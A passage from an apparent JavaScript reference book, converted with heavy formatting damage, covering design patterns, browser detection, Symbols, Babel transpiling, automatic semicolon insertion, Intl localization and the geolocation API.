**function**
(
<i>/&ast; pass initialization data if necessary &ast;/*
)
{
// <i>Private data is stored within the closure*
**var**
privateData
=
1
;
// <i>Because the function is immediately invoked,*
// <i>the return value becomes the public API*
**var**
api
=
{
getPrivateData
:
**function**
(
)
{
**return**
privateData
;
}
,
getDoublePrivateData
:
**function**
(
)
{
**return**
api.
getPrivateData
(
)
&ast;
2
;
}
}
;
**return**
api
;
}
)
(
<i>/&ast; pass initialization data if necessary &ast;/*
)
;
**Revealing Module Pattern**

The Revealing Module pattern is a variant in the Module pattern. The
key differences are that all members (private and public) are defined
within the closure, the return value is an object literal containing
no function definitions, and all references to member data are done
through direct references rather than through the returned object.

**var**
Module
=
(
**function**
(
<i>/&ast; pass initialization data if necessary &ast;/*
)
{
// <i>Private data is stored just like before*
**var**
privateData
=
1
;
// <i>All functions must be declared outside of the returned object*
**var**
getPrivateData
=
**function**
(
)
{
**return**
privateData
;
}
;
**var**
getDoublePrivateData
=
**function**
(
)
{
// <i>Refer directly to enclosed members rather than through the returned
object*

**return**

getPrivateData

(

)

&ast;

2

;

}

;

// <i>Return an object literal with no function definitions*

**return**

{

getPrivateData

:

getPrivateData

,

getDoublePrivateData

:

getDoublePrivateData

}

;

}

)

(

<i>/&ast; pass initialization data if necessary &ast;/*

)

;

**Revealing Prototype Pattern**
>
This variation of the revealing pattern is used to separate the
constructor to the methods. This pattern allow us to use the
javascript language like a objected oriented language:

![](./images/image038.png){width="7.486805555555556in"
height="7.459722222222222in"}

This code above should be in a separated file .js to be referenced in
any page that is needed. It can be used like this:

**var**

menuActive

=

**new**

NavigationNs.

active

(

&apos;ul.sidebar-menu li&apos;

,

5

)

;

menuActive.

setCurrent

(

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch65-4">Section 65.4: Prototype Pattern</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The prototype pattern focuses on creating an object that can be used
as a blueprint for other objects through prototypal inheritance. This
pattern is inherently easy to work with in JavaScript because of the
native support for prototypal inheritance in JS which means we don&apos;t
need to spend time or effort imitating this topology. **Creating
methods on the prototype**

**function**

Welcome

(

name

)

{

**this**

.

name

=

name

;

}

Welcome.

**prototype**
.
sayHello
=
**function**
(
)
{
**return**
&apos;Hello, &apos;
&plus;
**this**
.
name
&plus;
&apos;!&apos;
;
}
**var**
welcome
=
**new**
Welcome
(
&apos;John&apos;
)
;
welcome.
sayHello
(
)
;

// <i>=&bsol;Hello, John!*

**Prototypal Inheritance**
>
Inheriting from a &apos;parent object&apos; is relatively easy via the
following pattern
>
ChildObject.**prototype** = Object.create(ParentObject.**prototype**);
>
ChildObject.**prototype**.constructor = ChildObject;
>
Where ParentObject is the object you wish to inherit the prototyped
functions from, and ChildObject is the new Object you wish to put them
on.
>
If the parent object has values it initializes in its constructor you
need to call the parents constructor when initializing the child.
>
You do that using the following pattern in the ChildObject
constructor.

**function**

ChildObject

(

value

)

{

ParentObject.

call

(

**this**

,

value

)

;

}

A complete example where the above is implemented

**function**

RoomService

(

name

,

order

)

{

// <i>this.name will be set and made available on the scope of this
function*

Welcome.

call

(

**this**

,

name

)

;

**this**

.

order

=

order

;

}

// <i>Inherit &apos;sayHello()&apos; methods from &apos;Welcome&apos; prototype*

RoomService.

**prototype**

=

Object

.

create

(

Welcome.

**prototype**

)

;

// <i>By default prototype object has &apos;constructor&apos; property.*

// <i>But as we created new object without this property - we have to set
it manually,*

// <i>otherwise &apos;constructor&apos; property will point to &apos;Welcome&apos; class*

RoomService.
**prototype**
.
constructor
=
RoomService
;
RoomService.
**prototype**
.
announceDelivery
=
**function**
(
)
{
**return**
&apos;Your &apos;
&plus;
**this**
.
order
&plus;
&apos; has arrived!&apos;
;
}
RoomService.
**prototype**
.
deliverOrder
=
**function**
(
)
{
**return**
**this**
.
sayHello
(
)
&plus;
&apos; &apos;
&plus;
**this**
.
announceDelivery
(
)
;
}
**var**
delivery
=
**new**
RoomService
(
&apos;John&apos;
,
&apos;pizza&apos;
)
;
delivery.
sayHello
(
)
;
// <i>=&bsol;Hello, John!,*
delivery.
announceDelivery
(
)
;
// <i>Your pizza has arrived!*
delivery.
deliverOrder
(
)
;
// <i>=&bsol;Hello, John! Your pizza has arrived!*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch65-5">Section 65.5: Singleton Pattern</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The Singleton pattern is a design pattern that restricts the
instantiation of a class to one object. After the first object is
created, it will return the reference to the same one whenever called
for an object.

**var**

Singleton

=

(

**function**

(

)

{

// <i>instance stores a reference to the Singleton*

**var**

instance

;

**function**

createInstance

(

)

{

// <i>private variables and methods*

**var**

&lowbar;privateVariable
=
&apos;I am a private variable&apos;
;
**function**
&lowbar;privateMethod
(
)
{
console.
log
(
&apos;I am a private method&apos;
)
;
}
**return**
{
// <i>public methods and variables*
publicMethod
:
**function**
(

)

{

console.

log

(

&apos;I am a public method&apos;

)

;

}

,

publicVariable

:

&apos;I am a public variable&apos;

}

;

}

**return**

{

// <i>Get the Singleton instance if it exists*

// <i>or create one if doesn&apos;t*

getInstance

:

**function**

(

)

{

**if**

(

!

instance

)

{

instance

=

createInstance

(

)

;

}

**return**

instance

;

}

}

;

}

)

(

)

;

**Usage:**
>
// <i>there is no existing instance of Singleton, so it will create one*
**var** instance1 = Singleton.getInstance();
>
// <i>there is an instance of Singleton, so it will return the reference
to this one* **var** instance2 = Singleton.getInstance();
console.log(instance1 === instance2); // <i>true*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch65-6">Section 65.6: Abstract Factory Pattern</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The Abstract Factory Pattern is a creational design pattern that can
be used to define specific instances or classes without having to
specify the exact object that is being created.

![](./images/image039.png){width="7.486805555555556in"
height="4.045138888888889in"}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch66">Chapter 66: Detecting browser</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Browsers, as they have evolved, offered more features to JavaScript.
But often these features are not available in all browsers. Sometimes
they may be available in one browser, but yet to be released on other
browsers. Other times, these features are implemented differently by
different browsers. Browser detection becomes important to ensure that
the application you develop runs smoothly across different browsers
and devices.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch66-1">Section 66.1: Feature Detection Method</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
This method looks for the existence of browser specific things. This
would be more difficult to spoof, but is not guaranteed to be future
proof.
// <i>Opera 8.0+*
**var**
isOpera
=
(
!!
window.
opr
&&
!!
opr.
addons
)
&vert;&vert;
!!
window.
opera
&vert;&vert;
navigator.
userAgent
.
indexOf
(
&apos;
OPR/&apos;
)
&gt;=
0
;
// <i>Firefox 1.0+*
**var**
isFirefox
=
**typeof**
InstallTrigger
!==
&apos;undefined&apos;
;
// <i>At least Safari 3+: &quot;&lbrack;object HTMLElementConstructor&rbrack;&quot;</i>
**var**
isSafari
=
Object
.
**prototype**
.
toString
.
call
(
window.
HTMLElement
)
.
indexOf
(
&apos;Constructor&apos;
)
&gt;
0
;
// <i>Internet Explorer 6-11*
**var**
isIE
=
<i>/&ast;@cc_on!@&ast;/*
**false**
&vert;&vert;
!!
document.
documentMode
;
// <i>Edge 20+*
**var**
isEdge
=
!
isIE
&&
!!
window.
StyleMedia
;
// <i>Chrome 1+*
**var**
isChrome
=
!!
window.
chrome
&&
!!
window.
chrome
.
webstore
;
// <i>Blink engine detection*
**var**
isBlink
=
(
isChrome
&vert;&vert;
isOpera
)
&&
!!
window.
CSS
;
Successfully tested in:
Firefox 0.8 - 44
Chrome 1.0 - 48 Opera 8.0 - 34
Safari 3.0 - 9.0.3
IE 6 - 11
Edge - 20-25

Credit to [Rob W](http://stackoverflow.com/a/9851769/6194193)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch66-2">Section 66.2: User Agent Detection</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**&lt;browser** name                       **&gt;**   **&lt;version**
This method gets the user agent and parses it to find the browser. The
browser name and version are extracted from the user agent through a
regex. Based on these two, the **&gt;** is returned.

The four conditional blocks following the user agent matching code are
meant to account for differences in the user agents of different
browsers. For example, in case of opera, [since it uses Chrome
rendering engine](https://stackoverflow.com/a/17436191/5894241), there
is an additional step of ignoring that part.

Note that this method can be easily spoofed by a user.

![](./images/image040.png){width="7.486805555555556in"
height="2.6756944444444444in"}
Credit to [kennebec](http://stackoverflow.com/a/2401861/6194193)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch66-3">Section 66.3: Library Method</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
An easier approach for some would be to use an existing JavaScript
library. This is because it can be tricky to guarantee browser
detection is correct, so it can make sense to use a working solution
if one is available.
One popular browser-detection library is
[Bowser](https://github.com/ded/bowser).
Usage example:
**if**
(
bowser.
msie
&&
bowser.
version
&gt;=
6
)
{
alert
(
&apos;IE version 6 or newer&apos;
)
;
}
**else**
**if**
(
bowser.
firefox
)
{
alert
(
&apos;Firefox&apos;
)
;
}
**else**
**if**
(
bowser.
chrome
)
{
alert
(
&apos;Chrome&apos;
)
;
}
**else**
**if**
(
bowser.
safari
)
{
alert
(
&apos;Safari&apos;
)
;
}
**else**
**if**
(
bowser.
iphone
&vert;&vert;
bowser.
android
)
{
alert
(
&apos;iPhone or Android&apos;
)
;
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch67">Chapter 67: Symbols</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch67-1">Section 67.1: Basics of symbol primitive type</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Symbol is a new primitive type in ES6. Symbols are used mainly as
**property keys**, and one of its main characteristics is that they
are *unique*, even if they have the same description. This means they
will never have a name clash with any other property key that is a
symbol or string.
**const**
MY_PROP_KEY
=
Symbol
(
)
;
**const**
obj
=
{
}
;
obj
&lbrack;
MY_PROP_KEY
&rbrack;
=
&quot;ABC&quot;
;
console.
log
(
obj
&lbrack;
MY_PROP_KEY
&rbrack;
)
;
In this example, the result of
console.
log
would be
ABC
.
You can also have named Symbols like:
**const**
APPLE
=
Symbol
(
&apos;Apple&apos;
)
;
**const**
BANANA
=
Symbol
(
&apos;Banana&apos;
)
;
**const**
GRAPE
=
Symbol
(
&apos;Grape&apos;
)
;
Each of these values are unique and cannot be overridden.
description
Symbol.**for**
Providing an optional parameter () when creating primitive symbols can
be used for debugging but not to access the symbol itself (but see the
() example for a way to register/lookup global shared symbols).
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch67-2">Section 67.2: Using Symbol.for() to create global, shared symbols</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Symbol.**for**
The method allows you to register and look up global symbols by name.
The first time it is called with a given key, it creates a new symbol
and adds it to the registry.
**let**
a
=
Symbol.
**for**
(
&apos;A&apos;
)
;
Symbol.**for**   ( &apos;A&apos;
Symbol  (       &apos;A&apos;
The next time you call ), the *same symbol* will be returned instead
of a new one (in contrast to ) which would create a new, unique symbol
that happens to have the same description).
a
===
Symbol.
**for**
(
&apos;A&apos;
)
// <i>true*
but
a
===
Symbol
(
&apos;A&apos;
)
// <i>false*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch67-3">Section 67.3: Converting a symbol into a string</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Unlike most other JavaScript objects, symbols are not automatically
converted into a string when performing concatenation.
**let**
apple
=
Symbol
(
&apos;Apple&apos;
)
&plus;
&apos;&apos;
;
// <i>throws TypeError!*
Instead, they have to be explicitly converted into a string when
necessary, (for example, to get a textual description of the symbol
that can be used in a debug message) using the toString method or the
String constructor.
**const**
APPLE
=
Symbol
(
&apos;Apple&apos;
)
;
**let**
str1
=
APPLE.
toString
(
)
;
// <i>&quot;Symbol(Apple)&quot;</i>
**let**
str2
=
String
(
APPLE
)
;
// <i>&quot;Symbol(Apple)&quot;</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch68">Chapter 68: Transpiling</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Transpiling is the process of interpreting certain programming
languages and translating it to a specific target language. In this
context, transpiling will take [compile-to-JS
languages](https://github.com/jashkenas/coffeescript/wiki/list-of-languages-that-compile-to-js)
and translate them into the **target** language of JavaScript.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch68-1">Section 68.1: Introduction to Transpiling</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Examples**
>
**ES6/ES2015 to ES5 (via [Babel](https://babeljs.io/))**: This ES2015
syntax

// <i>ES2015 arrow function syntax*
&lbrack;
1
,
2
,
3
&rbrack;
.
map
(
n
=&gt;
n
&plus;
1
)
;
is interpreted and translated to this ES5 syntax:
// <i>Conventional ES5 anonymous function syntax*
&lbrack;
1
,
2
,
3
&rbrack;
.
map
(
**function**
(
n
)
{
**return**
n
&plus;
1
;
}
)
;
**CoffeeScript to JavaScript (via built-in CoffeeScript compiler)**:
This CoffeeScript
&bsol;# Existence
:
alert
&quot;I knew it!&quot;
**if**
elvis
?
is interpreted and translated to JavaScript:
**if**
(
*typeof**
elvis
!==
&quot;undefined&quot;
&&
elvis
!==
**null**
)
{
alert
(
&quot;I knew it!&quot;
)
;
}
**How do I transpile?**
>
Most compile-to-JavaScript languages have a transpiler **built-in**
(like in CoffeeScript or TypeScript). In this case, you may just need
to enable the language&apos;s transpiler via config settings or a
checkbox. Advanced settings can also be set in relation to the
transpiler.
For **ES6/ES2016-to-ES5 transpiling**, the most prominent transpiler
being used is [Babel](https://babeljs.io/).
**Why should I transpile?**
The most cited benefits include:
The ability to use newer syntax reliably
Compatibility among most, if not all browsers
Usage of missing/not yet native features to JavaScript via languages
like CoffeeScript or TypeScript
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch68-2">Section 68.2: Start using ES6/7 with Babel</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
[Browser support for ES6](https://kangax.github.io/compat-table/es6/)
is growing, but to be sure your code will work on environments that
don&apos;t fully support it, you can use [Babel](https://babeljs.io/), the
ES6/7 to ES5 transpiler, [try it out!](https://babeljs.io/repl/)

If you would like to use ES6/7 in your projects without having to
worry about compatibility, you can use [Node](https://nodejs.org/en/)
and [Babel CLI](https://babeljs.io/docs/usage/cli/)

**Quick setup of a project with Babel for ES6/7 support**
1.  [Download](https://nodejs.org/en/download/) and install Node
2.  Go to a folder and create a project using your favourite command
    line tool
&bsol;~ npm init
3.  Install Babel CLI
&bsol;~ npm
**install**
&bsol;
save-dev
babel-cli
&bsol;~ npm
**install**
&bsol;
save-dev
babel-preset-es2015
js   files, and then a                    dist      /   scripts
4.  Create a scripts folder to store your . folder where the transpiled
    fully compatible files will be stored.
babelrc
5.  Create a . file in the root folder of your project, and write this
    on it
{
&quot;presets&quot;
:
&lbrack;
&quot;es2015&quot;
&rbrack;
}
package.json
6.  Edit your file (created when you ran npm init) and add the build
    script to the scripts property:
{
&hellip;
&quot;scripts&quot;
:
{
&hellip;
,
&quot;build&quot;
:
&quot;babel scripts &bsol;out-dir dist/scripts&quot;
}
,
&hellip;
}
7.  Enjoy [programming in ES6/7](https://babeljs.io/docs/learn-es2015/)
8.  Run the following to transpile all your files to ES5
&bsol;~ npm run build
For more complex projects you might want to take a look at
[Gulp](http://gulpjs.com/) or [Webpack](https://webpack.github.io/)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch69">Chapter 69: Automatic Semicolon Insertion - ASI</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch68-1">Section 69.1: Avoid semicolon insertion on return statements</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
The JavaScript coding convention is to place the starting bracket of
blocks on the same line of their declaration:
**if**
(
&hellip;
)
{
}
**function**
(
a
,
b
,
&hellip;
)
{
}
Instead of in the next line:
**if**

(
&hellip;
)
{
}
**function**
(
a
,
b
,
&hellip;
)
{
}
This has been adopted to avoid semicolon insertion in return
statements that return objects:
**function**
foo
(
)
{
**return**
// <i>A semicolon will be inserted here, making the function return
nothing*
{
foo
:
&apos;foo&apos;
}
;
}
foo
(
)
;
// <i>undefined*
**function**
properFoo
(
)
{
**return**
{
foo
:
&apos;foo&apos;
}
;
}
properFoo
(
)
;
// <i>{ foo: &apos;foo&apos; }*
In most languages the placement of the starting bracket is just a
matter of personal preference, as it has no real impact on the
execution of the code. In JavaScript, as you&apos;ve seen, placing the
initial bracket in the next line can lead to silent errors.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch69-2">Section 69.2: Rules of Automatic Semicolon Insertion</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
There are three basic rules of semicolon insertion:
1.  When, as the program is parsed from left to right, a token (called
    the *offending token*) is encountered that is not allowed by any
    production of the grammar, then a semicolon is automatically
    inserted before the offending token if one or more of the following
    conditions is true:
The offending token is separated from the previous token by at least
one LineTerminator. The offending token is }.
2.  When, as the program is parsed from left to right, the end of the
    input stream of tokens is encountered and the parser is unable to
    parse the input token stream as a single complete ECMAScript
    Program, then a semicolon is automatically inserted at the end of
    the input stream.
3.  When, as the program is parsed from left to right, a token is
    encountered that is allowed by some production of the grammar, but
    the production is a *restricted production* and the token would be
    the first token for a terminal or nonterminal immediately following
    the annotation &quot;&lbrack;no LineTerminator here&rbrack;&quot; within the restricted
    production (and therefore such a token is called a restricted
    token), and the restricted token is separated from the previous
    token by at least one LineTerminator, then a semicolon is
    automatically inserted before the restricted token.
However, there is an additional overriding condition on the preceding
rules: a semicolon is never inserted automatically if the semicolon
would then be parsed as an empty statement or if that semicolon would
become one of the two semicolons in the header of a **for** statement
(see 12.6.3).
**Source: [ECMA-262, Fifth Edition ECMAScript
Specification:](http://www.ecma-international.org/publications/standards/Ecma-262.htm)**
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch69-3">Section 69.3: Statements aected by automatic semicolon insertion</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
do &minus; while
empty statement **var** statement expression statement statement
**continue** statement **break** statement **return** statement
**throw** statement
**Examples:**
When the end of the input stream of tokens is encountered and the
parser is unable to parse the input token stream as a single complete
Program, then a semicolon is automatically inserted at the end of the
input stream.
a
=
b
++
c
// <i>is transformed to:*
a
=
b
;
++
c
;

x

++

y

// <i>is transformed to:*

x

;

++

y

;

**Array indexing/literals**

console.

log

(

&quot;Hello, World&quot;

)

&lbrack;

1

,

2

,

3

&rbrack;

.

join
(
)
// <i>is transformed to:*
console.
log
(
&quot;Hello, World&quot;
)
&lbrack;
(
1
,
2
,
3
)
&rbrack;
.
join
(
)
;
**Return statement:**
**return**
&quot;something&quot;
;
// <i>is transformed to*
**return**
;
&quot;something&quot;
;
<h2 id="ch70">Chapter 70: Localization</h2>
| **Paramater**  | **Details**                                     |
| weekday          | &quot;narrow&quot;, &quot;short&quot;, &quot;long&quot;                   |
| era              | &quot;narrow&quot;, &quot;short&quot;, &quot;long&quot;                   |
| year             | &quot;numeric&quot;, &quot;2-digit&quot;                          |
| month            | &quot;numeric&quot;, &quot;2-digit&quot;, &quot;narrow&quot;, &quot;short&quot;,  |
|                  | &quot;long&quot;                                          |
| day              | &quot;numeric&quot;, &quot;2-digit&quot;                          |
| hour             | &quot;numeric&quot;, &quot;2-digit&quot;                          |
| minute           | &quot;numeric&quot;, &quot;2-digit&quot;                          |
| second           | &quot;numeric&quot;, &quot;2-digit&quot;                          |
timeZoneName &quot;short&quot;, &quot;long&quot;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch70-1">Section 70.1: Number formatting</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
Number formatting, grouping digits according to the localization.
**const** usNumberFormat = **new** Intl.NumberFormat(&apos;en-US&apos;);
**const** esNumberFormat = **new** Intl.NumberFormat(&apos;es-ES&apos;);
**const** usNumber = usNumberFormat.format(99999999.99); // <i>
&quot;99,999,999.99&quot;</i> **const** esNumber =
esNumberFormat.format(99999999.99); // <i>&quot;99.999.999,99&quot;</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch70-2">Section 70.2: Currency formatting</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
Currency formatting, grouping digits and placing the currency symbol
according to the localization.
**const** usCurrencyFormat = **new** Intl.NumberFormat(&apos;en-US&apos;,
{style: &apos;currency&apos;, currency: &apos;USD&apos;}) **const** esCurrencyFormat =
**new** Intl.NumberFormat(&apos;es-ES&apos;, {style: &apos;currency&apos;, currency:
&apos;EUR&apos;})
**const** usCurrency = usCurrencyFormat.format(100.10); // <i>
&quot;&dollar;100.10&quot;</i> **const** esCurrency = esCurrencyFormat.format(100.10);
// <i>&quot;100.10* €*&quot;</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch70-3">Section 70.3: Date and time formatting</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
Date time formatting, according to the localization.
**const** usDateTimeFormatting = **new**
Intl.DateTimeFormat(&apos;en-US&apos;); **const** esDateTimeFormatting =
**new** Intl.DateTimeFormat(&apos;es-ES&apos;);
**const** usDate = usDateTimeFormatting.format(**new**
Date(&apos;2016-07-21&apos;)); // <i>&quot;7/21/2016&quot;</i> **const** esDate =
esDateTimeFormatting.format(**new** Date(&apos;2016-07-21&apos;)); // <i>
&quot;21/7/2016&quot;</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch71">Chapter 71: Geolocation</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch71-1">Section 71.1: Get updates when a user&apos;s location changes</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
You can also receive regular updates of the user&apos;s location; for
example, as they move around while using a mobile device. Location
tracking over time can be very sensitive, so be sure to explain to the
user ahead of time why you&apos;re requesting this permission and how
you&apos;ll use the data.
**if**
(
navigator.
geolocation
)
{
// <i>after the user indicates that they want to turn on continuous
location-tracking*
**var**
watchId
=
navigator.
geolocation
.
watchPosition
(
updateLocation
,
geolocationFailure
)
;
}
**else**
{
console.
log
(
&quot;Geolocation is not supported by this browser.&quot;
)
;
}
**var**
updateLocation
=
**function**
(
position
)
{
console.
log
(
&quot;New position at: &quot;
&plus;
position.
coords
.
latitude
&plus;
&quot;, &quot;
&plus;
position.
coords
.
longitude
)
;
}
;
To turn off continuous updates:
navigator.
geolocation
.
clearWatch
(
watchId
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch71-2">Section 71.2: Get a user&apos;s latitude and longitude</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
**if**
(
navigator.
geolocation
)
{
navigator.
geolocation
.
getCurrentPosition
(
geolocationSuccess
,
geolocationFailure
)
;
}
**else**
{
console.
log
(
&quot;Geolocation is not supported by this browser.&quot;
)
;
}
// <i>Function that will be called if the query succeeds*
**var**
geolocationSuccess
=
**function**
(
pos
)
{
console.
log
(
&quot;Your location is &quot;
&plus;
pos.
coords
.
latitude
&plus;
&quot;
°
, &quot;
&plus;
pos.
coords
.
longitude
&plus;
&quot;
°
.&quot;
)
;
}
;
// <i>Function that will be called if the query fails*
**var**
geolocationFailure
=
**function**
(
err
)
{
console.
log
(
